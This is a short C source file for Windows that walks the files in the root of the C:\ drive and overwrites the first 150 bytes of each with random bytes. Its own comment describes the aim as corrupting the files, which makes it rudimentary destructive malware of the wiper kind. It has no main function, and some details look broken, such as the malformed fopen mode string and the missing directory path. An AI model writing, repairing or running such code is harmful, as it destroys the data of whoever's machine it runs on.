#include <windows.h>
#include <stdlib.h>
#include <stdio.h>


int flipFile(char *filename) {
    //Open filename parameter and add random bytes to the file to corrupt it
    FILE *fp = fopen(filename, "r + b");
    if (fp == NULL) {
        printf("Error opening file\n");
        return 1;

     }
     //flips the first 150 bytes of file
     for (int i = 0; i < 150; i++) {
        fputc(rand() % 256, fp);
     }

     fclose(fp);
     return 0;

}

void traverseDir() {
    //Traverses every file in the directory
    char *path = "C:\\";
    char *filename = "C:\\*.*";
    WIN32_FIND_DATA data;
    HANDLE hFind = FindFirstFile(filename, &data);
    if (hFind == INVALID_HANDLE_VALUE) {
        printf("Error opening file\n");
        return;
    }
    do {
        if (!(data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            flipFile(data.cFileName);
        }
    } while (FindNextFile(hFind, &data) != 0);
}
